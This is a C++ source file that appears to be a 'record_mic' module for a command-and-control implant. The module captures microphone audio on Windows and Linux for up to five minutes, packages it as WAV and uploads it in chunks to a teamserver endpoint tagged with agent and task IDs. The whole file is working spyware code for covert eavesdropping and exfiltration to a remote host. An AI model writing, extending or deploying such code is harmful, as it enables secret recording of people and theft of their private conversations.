// record_mic: one-shot microphone recording.
//
// Records audio from the default capture device at 44100Hz/16-bit/stereo
// for the requested duration, wraps the PCM in a WAV container, and posts
// the bytes in chunks to the teamserver's /api/upload/stream endpoint.
// The teamserver reassembles the chunks into a final WAV artifact.
//
// Args: [duration_s=10, frames_per_chunk=50]

#include "../json.hpp"
#include "../protocol.h"
#include "registry.h"
#include "stream_common.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <chrono>
#include <thread>
#else
#ifdef NAGOMIO_HAS_ALSA
#include <alsa/asoundlib.h>
#endif
#include <chrono>
#include <thread>
#endif

namespace nagomio_modules {

static const int MIC_SAMPLE_RATE = 44100;
static const int MIC_CHANNELS = 2;
static const int MIC_BITS_PER_SAMPLE = 16;

static std::vector<unsigned char> build_wav(const std::vector<unsigned char>& pcm) {
    std::vector<unsigned char> wav;
    uint32_t data_size = static_cast<uint32_t>(pcm.size());
    uint32_t byte_rate = MIC_SAMPLE_RATE * MIC_CHANNELS * (MIC_BITS_PER_SAMPLE / 8);
    uint16_t block_align = MIC_CHANNELS * (MIC_BITS_PER_SAMPLE / 8);

    wav.push_back('R'); wav.push_back('I'); wav.push_back('F'); wav.push_back('F');
    nagomio_stream::write_le32(wav, 36 + data_size);
    wav.push_back('W'); wav.push_back('A'); wav.push_back('V'); wav.push_back('E');

    wav.push_back('f'); wav.push_back('m'); wav.push_back('t'); wav.push_back(' ');
    nagomio_stream::write_le32(wav, 16);
    nagomio_stream::write_le16(wav, 1);
    nagomio_stream::write_le16(wav, MIC_CHANNELS);
    nagomio_stream::write_le32(wav, MIC_SAMPLE_RATE);
    nagomio_stream::write_le32(wav, byte_rate);
    nagomio_stream::write_le16(wav, block_align);
    nagomio_stream::write_le16(wav, MIC_BITS_PER_SAMPLE);

    wav.push_back('d'); wav.push_back('a'); wav.push_back('t'); wav.push_back('a');
    nagomio_stream::write_le32(wav, data_size);
    wav.insert(wav.end(), pcm.begin(), pcm.end());
    return wav;
}

#ifdef _WIN32

struct WaveInCtx {
    std::vector<unsigned char> data;
    std::array<WAVEHDR, 8> headers{};
    std::array<std::vector<unsigned char>, 8> buffers{};
};

static void CALLBACK wave_in_proc(HWAVEIN, UINT msg, DWORD_PTR instance,
                                   DWORD_PTR, DWORD) {
    auto* ctx = reinterpret_cast<WaveInCtx*>(instance);
    if (msg == WIM_DATA) {
        for (auto& h : ctx->headers) {
            if (h.dwBytesRecorded > 0) {
                ctx->data.insert(ctx->data.end(),
                                 reinterpret_cast<unsigned char*>(h.lpData),
                                 reinterpret_cast<unsigned char*>(h.lpData) + h.dwBytesRecorded);
                h.dwBytesRecorded = 0;
            }
        }
    }
}

std::string handle_record_mic(const std::vector<std::string>& args) {
    int duration_s = nagomio_stream::parse_int_arg(args, 0, 10);
    int frames_per_chunk = nagomio_stream::parse_int_arg(args, 1, 50);
    if (duration_s < 1) duration_s = 1;
    if (duration_s > 300) duration_s = 300;
    if (frames_per_chunk < 1) frames_per_chunk = 1;
    if (frames_per_chunk > 200) frames_per_chunk = 200;

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    WAVEFORMATEX wf{};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = MIC_CHANNELS;
    wf.nSamplesPerSec = MIC_SAMPLE_RATE;
    wf.wBitsPerSample = MIC_BITS_PER_SAMPLE;
    wf.nBlockAlign = (wf.nChannels * wf.wBitsPerSample) / 8;
    wf.nAvgBytesPerSec = wf.nSamplesPerSec * wf.nBlockAlign;
    wf.cbSize = 0;

    WaveInCtx ctx;
    HWAVEIN hwi = nullptr;
    if (waveInOpen(&hwi, WAVE_MAPPER, &wf, (DWORD_PTR)wave_in_proc,
                   (DWORD_PTR)&ctx, CALLBACK_FUNCTION) != MMSYSERR_NOERROR)
        return std::string("{\"error\":\"failed to open microphone\"}");

    const int buf_count = 8;
    const int buf_samples = MIC_SAMPLE_RATE / 4;
    const int buf_bytes = buf_samples * wf.nBlockAlign;
    for (int i = 0; i < buf_count; ++i) {
        ctx.buffers[i].resize(buf_bytes);
        ctx.headers[i] = {};
        ctx.headers[i].lpData = reinterpret_cast<LPSTR>(ctx.buffers[i].data());
        ctx.headers[i].dwBufferLength = buf_bytes;
        waveInPrepareHeader(hwi, &ctx.headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hwi, &ctx.headers[i], sizeof(WAVEHDR));
    }
    waveInStart(hwi);

    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(duration_s);
    while (std::chrono::steady_clock::now() < deadline) {
        if (nagomio_modules::stream_stop_requested()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    waveInStop(hwi);
    waveInReset(hwi);
    for (int i = 0; i < buf_count; ++i) {
        waveInUnprepareHeader(hwi, &ctx.headers[i], sizeof(WAVEHDR));
    }
    waveInClose(hwi);

    if (ctx.data.empty()) return std::string("{\"error\":\"no audio captured\"}");

    auto wav = build_wav(ctx.data);

    // Send the WAV as a single chunk (or split if very large).
    auto upload_wav = [&](const std::vector<unsigned char>& chunk, uint32_t seq,
                          bool final) -> bool {
        uint32_t flags = final ? 1u : 0u;
        std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
        std::vector<unsigned char> body;
        nagomio_stream::write_be32(body, seq);
        nagomio_stream::write_be32(body, flags);
        // Type tag = 'WAV ' (4 bytes) so the server knows how to interpret the body.
        body.push_back('W'); body.push_back('A'); body.push_back('V'); body.push_back(' ');
        body.insert(body.end(), chunk.begin(), chunk.end());
        auto r = NagomioHttp::post_binary(endpoint, body);
        return r.ok && r.status < 400;
    };

    bool ok = true;
    if (wav.size() <= 512 * 1024) {
        ok = upload_wav(wav, 0, true);
    } else {
        size_t pos = 0;
        uint32_t seq = 0;
        while (pos < wav.size()) {
            size_t end = std::min(pos + 512 * 1024, wav.size());
            std::vector<unsigned char> piece(wav.begin() + pos, wav.begin() + end);
            bool final = end == wav.size();
            if (!upload_wav(piece, seq++, final)) { ok = false; break; }
            pos = end;
        }
    }

    nlohmann::json j = {
        {"type",        "record_mic"},
        {"duration_s",  duration_s},
        {"sample_rate", MIC_SAMPLE_RATE},
        {"channels",    MIC_CHANNELS},
        {"bits_per_sample", MIC_BITS_PER_SAMPLE},
        {"size",        wav.size()},
        {"ok",          ok},
    };
    return j.dump();
}

#else // Linux

#ifdef NAGOMIO_HAS_ALSA

std::string handle_record_mic(const std::vector<std::string>& args) {
    int duration_s = nagomio_stream::parse_int_arg(args, 0, 10);
    if (duration_s < 1) duration_s = 1;
    if (duration_s > 300) duration_s = 300;

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    snd_pcm_t* handle = nullptr;
    if (snd_pcm_open(&handle, "default", SND_PCM_STREAM_CAPTURE, 0) < 0)
        return std::string("{\"error\":\"failed to open ALSA capture device\"}");

    snd_pcm_hw_params_t* params = nullptr;
    snd_pcm_hw_params_malloc(&params);
    snd_pcm_hw_params_any(handle, params);
    snd_pcm_hw_params_set_access(handle, params, SND_PCM_ACCESS_RW_INTERLEAVED);
    snd_pcm_hw_params_set_format(handle, params, SND_PCM_FORMAT_S16_LE);
    snd_pcm_hw_params_set_channels(handle, params, MIC_CHANNELS);
    unsigned int rate = MIC_SAMPLE_RATE;
    snd_pcm_hw_params_set_rate_near(handle, params, &rate, nullptr);
    snd_pcm_hw_params(handle, params);
    snd_pcm_hw_params_free(params);
    snd_pcm_prepare(handle);

    const int frame_size = MIC_CHANNELS * (MIC_BITS_PER_SAMPLE / 8);
    std::vector<unsigned char> pcm;
    pcm.reserve(static_cast<size_t>(duration_s) * MIC_SAMPLE_RATE * frame_size);

    int16_t buf[4096];
    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(duration_s);
    while (std::chrono::steady_clock::now() < deadline) {
        if (nagomio_modules::stream_stop_requested()) break;
        int frames = snd_pcm_readi(handle, buf, 4096 / frame_size);
        if (frames > 0) {
            pcm.insert(pcm.end(),
                       reinterpret_cast<unsigned char*>(buf),
                       reinterpret_cast<unsigned char*>(buf) + frames * frame_size);
        } else if (frames == -EPIPE) {
            snd_pcm_prepare(handle);
        } else if (frames < 0) {
            break;
        }
    }
    snd_pcm_close(handle);

    if (pcm.empty()) return std::string("{\"error\":\"no audio captured\"}");

    auto wav = build_wav(pcm);

    auto upload_wav = [&](const std::vector<unsigned char>& chunk, uint32_t seq,
                          bool final) -> bool {
        uint32_t flags = final ? 1u : 0u;
        std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
        std::vector<unsigned char> body;
        nagomio_stream::write_be32(body, seq);
        nagomio_stream::write_be32(body, flags);
        body.push_back('W'); body.push_back('A'); body.push_back('V'); body.push_back(' ');
        body.insert(body.end(), chunk.begin(), chunk.end());
        auto r = NagomioHttp::post_binary(endpoint, body);
        return r.ok && r.status < 400;
    };

    bool ok = true;
    if (wav.size() <= 512 * 1024) {
        ok = upload_wav(wav, 0, true);
    } else {
        size_t pos = 0;
        uint32_t seq = 0;
        while (pos < wav.size()) {
            size_t end = std::min(pos + 512 * 1024, wav.size());
            std::vector<unsigned char> piece(wav.begin() + pos, wav.begin() + end);
            bool final = end == wav.size();
            if (!upload_wav(piece, seq++, final)) { ok = false; break; }
            pos = end;
        }
    }

    nlohmann::json j = {
        {"type",        "record_mic"},
        {"duration_s",  duration_s},
        {"sample_rate", rate},
        {"channels",    MIC_CHANNELS},
        {"bits_per_sample", MIC_BITS_PER_SAMPLE},
        {"size",        wav.size()},
        {"ok",          ok},
    };
    return j.dump();
}

#else // !NAGOMIO_HAS_ALSA

std::string handle_record_mic(const std::vector<std::string>&) {
    return std::string("{\"error\":\"ALSA not available (install libasound2-dev to enable mic support)\"}");
}

#endif // NAGOMIO_HAS_ALSA
#endif // _WIN32

} // namespace nagomio_modules
